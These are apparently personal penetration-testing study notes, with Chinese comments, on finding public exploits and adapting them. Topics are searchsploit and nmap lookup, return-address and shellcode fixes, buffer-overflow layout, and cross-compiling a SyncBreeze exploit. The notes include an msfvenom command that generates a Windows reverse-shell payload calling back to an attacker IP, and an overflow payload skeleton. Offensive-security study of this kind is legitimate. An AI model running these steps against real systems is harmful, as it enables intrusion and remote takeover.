# Locate Exploit
### Searchspliot
https://www.exploit-db.com/documentation/Offsec-SearchSploit.pdf
```bash
searchsploit -u #update db
#accurate remote/local/.. win/lin...
searchsploit remote smb microsoft windows 
--exclude="Poc" #Exclude unwanted
searchsploit vsftpd 2.3.4 -w # to db website

# play with nmap
Nmap -Pn 172.21.0.0 -oX results.xml
searchsploit -x --nmap results.xml
```
##### Include Exploit Binary
```bash
apt update && apt install exploitdb-bin-sploits
```
### Nmap NSE
```bash
grep -i exploit /usr/share/nmap/scripts/*.nse
nmap --script-help=clamav-exec.nse #查看脚本的使用说明
```
### Exploit Datebase
### Google
 `firefox --search "Microsoft Edge site:exploit-db.com"`
### GitHub
### [Packet Storm](https://packetstormsecurity.com/)
# Fixing Exploit
## Fix Return Addr
```c
/*替换成其他dll文件返回地址 jmp = 10 09 0c 83 libspp.dll*/
   unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll
//修改后
unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83
```
## Fix Shellcode
create your own Shellcode
```bash
# -b:坏字符 --list-options:查看payload选项 -e x86/shikata_ga_nai
# -v: var name
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
## Change the overflow buffer
Via Debugger to decide the buffer size.Then get the correct shoot!  on the RETURN ADDR!
```c
memset(padding, 0x41, initial_buffer_size);
memset(padding + initial_buffer_size - 1, 0x00, 1);
```
## C
```c
#通常需要修改的也是在这三项中：偏移量，返回地址，shellcode
offset    = "A" * 780 
JMP_ESP   =  "\x83\x0c\x09\x10"
shellcode = "\x90"*16 + msf_shellcode
exploit   = offset + JMP_ESP + shellcode
```
### Cross-Compiling Exploit Code
```c
/*该代码有需要在windows主机上编译的头文件；
在kali主机中不可。此时就需要交叉编译*/
#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
```
#### Cross-Compilier
```bash
sudo apt install mingw-w64

#使用mingw来编译利用程序
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
# 对于找不到winsock.h头文件时，可以连接本地DLL(-l)来链接ws2_32
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```
```bash
sudo apt install wine
dpkg --add-architecture i386 && apt-get update && apt-get install wine32:i386
```
#### cross-architecture
	跨架构的C头文件
```bash
sudo apt-get install gcc-multilib -y
gcc 15285.c -o 15285 -m32 # -m32
```
